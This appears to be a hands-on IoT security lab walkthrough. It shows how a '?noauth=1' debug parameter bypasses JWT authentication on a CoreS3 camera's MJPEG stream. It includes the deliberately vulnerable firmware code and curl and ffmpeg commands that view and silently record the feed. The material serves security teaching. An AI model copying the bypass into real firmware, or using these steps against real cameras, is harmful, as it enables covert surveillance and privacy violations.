# L17: MJPEG Stream Without Authentication

## Goal
Access the live camera stream without authentication by exploiting the `?noauth=1` bypass parameter, demonstrating unauthorized surveillance access.

## Background

**Why this matters**: MJPEG camera streams without authentication allow anyone on the network to view live video feeds. Thousands of cameras are exposed on the public internet through Shodan because developers leave authentication disabled or include debug bypass parameters.

**What you're looking for in IoT devices:**
- MJPEG stream endpoints without authentication (`/mjpeg`, `/video`, `/stream`)
- Debug or compatibility parameters that bypass authentication (`?noauth=1`, `?debug=1`)
- Default configurations with authentication disabled

**Why this happens:**
- Developers add debug/compatibility parameters during development and leave them in production
- Legacy MJPEG protocol predates modern security practices
- Developers assume local network is trusted

**On CoreS3**: The `/stream` endpoint normally requires a valid JWT token (via `Authorization: Bearer <token>` header or `?token=<jwt>` query parameter). However, `?noauth=1` completely bypasses authentication. The firmware checks `webServer->hasArg("noauth")`, which returns true if the parameter exists regardless of value - even `?noauth=0` bypasses auth.

**Vulnerable pattern (from firmware):**
```cpp
void CameraDevice::handleStream() {
    if (webServer->hasArg("noauth")) {
        // Bypass auth entirely - no token check!
        DualSerial.println("[STREAM] No authentication required (debug/compat mode via ?noauth=1)");
    } else {
        // Normal path: require valid JWT token
        String token = "";
        String auth = webServer->header("Authorization");
        if (auth.startsWith("Bearer ")) {
            token = auth.substring(7);
        }
        if (token.length() == 0) {
            token = webServer->arg("token");
        }
        // ... verify JWT, extract claims, reject if invalid ...
    }
}
```

**MJPEG format:**
```
--frame
Content-Type: image/jpeg
Content-Length: 12345

[JPEG data]
--frame
Content-Type: image/jpeg
...
```

## Lab Walkthrough

### Step 1: Connect to the Device

Connect to the CoreS3 WiFi AP (open, no password) and verify the web interface is accessible.

```bash
# SSID: CoreS3-CAM-XXXX (open, no password)
# Device IP: 192.168.4.1

curl -s http://192.168.4.1/ | head -20

# Expected response (HTML page with camera UI):
# <!DOCTYPE html><html><head><meta charset='UTF-8'>
# <title>CoreS3 Camera</title>
# ...
```

### Step 2: Confirm the Stream Requires Authentication Normally

Access `/stream` without authentication to establish a baseline - the normal path rejects unauthenticated requests.

```bash
curl -v http://192.168.4.1/stream 2>&1 | head -20

# Expected response:
# < HTTP/1.1 401 Unauthorized
# < Content-Type: text/plain
# <
# Unauthorized - Please login first to view stream
```

Serial output:
```
[STREAM] Rejected: No valid token
```

### Step 3: Bypass Authentication with ?noauth=1

Add `?noauth=1` to bypass all authentication checks.

```bash
curl -v --max-time 2 "http://192.168.4.1/stream?noauth=1" -o /dev/null 2>&1 | head -10

# Expected response headers (GET, not HEAD - ESP32 WebServer returns 404 for HEAD on stream):
# < HTTP/1.1 200 OK
# < Content-Type: multipart/x-mixed-replace; boundary=frame
# < Access-Control-Allow-Origin: *
```

The `200 OK` with `multipart/x-mixed-replace` confirms the MJPEG stream is accessible without authentication.

Serial output:
```
[STREAM] No authentication required (debug/compat mode via ?noauth=1)
[STREAM] Client connected, starting stream
```

### Step 4: View the Live Stream in a Browser

Open the unauthenticated stream URL to view the live camera feed. No credentials, no tokens, no login page - just append `?noauth=1`.

```bash
# Open in browser
firefox "http://192.168.4.1/stream?noauth=1"

# Or use VLC (handles MJPEG natively)
vlc "http://192.168.4.1/stream?noauth=1"

# Or use mpv
mpv "http://192.168.4.1/stream?noauth=1"
```

### Step 5: Record the Stream

Save the stream to a file for later analysis. The recording happens passively with no indication on the device.

```bash
# Record 30 seconds of the stream (raw MJPEG)
timeout 30 curl -s "http://192.168.4.1/stream?noauth=1" -o recording.mjpeg

# Or use ffmpeg for better format handling
ffmpeg -i "http://192.168.4.1/stream?noauth=1" -t 30 -c copy recording.avi

# Extract individual frames as separate JPEG files
ffmpeg -i recording.mjpeg -vf fps=1 frame_%04d.jpg

# Check captured frames
ls -la frame_*.jpg
# frame_0001.jpg  12847 bytes
# frame_0002.jpg  13201 bytes
# ...
```

### Step 6: Observe Serial Output During Unauthenticated Access

Monitor serial while accessing the stream to see which code path was taken.

```bash
pio device monitor -b 115200

# When you access /stream?noauth=1:
[STREAM] No authentication required (debug/compat mode via ?noauth=1)
[STREAM] Client connected, starting stream
```

Compare with the authenticated path (valid JWT):
```
[STREAM] Authenticated as admin (role: admin)
[STREAM] Client connected, starting stream
```

The unauthenticated path logs a debug message but does not flag the access as unauthorized, making detection difficult.

## Impact

- **Unauthorized surveillance**: Anyone on the network can view the live camera feed by appending `?noauth=1`
- **Privacy violation**: 320x240 video may capture sensitive areas (homes, offices, restricted zones)
- **Silent recording**: Attacker can record video with `curl` or `ffmpeg` with no indication on the device
- **No audit trail**: The bypass logs a debug message but does not flag unauthorized access
- **Network-wide exposure**: The WiFi AP is open (no WPA password), so any nearby device can connect and view the stream
- **Scalable attack**: Automated scripts can discover and record from multiple cameras using Shodan or network scanning

## References

- [OWASP Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
- [CWE-306: Missing Authentication for Critical Function](https://cwe.mitre.org/data/definitions/306.html)
- [CWE-287: Improper Authentication](https://cwe.mitre.org/data/definitions/287.html)
- [Shodan - Search Engine for IoT Devices](https://www.shodan.io/)
- [ESP32-S3 Technical Reference Manual](https://www.espressif.com/sites/default/files/documentation/esp32-s3_technical_reference_manual_en.pdf)
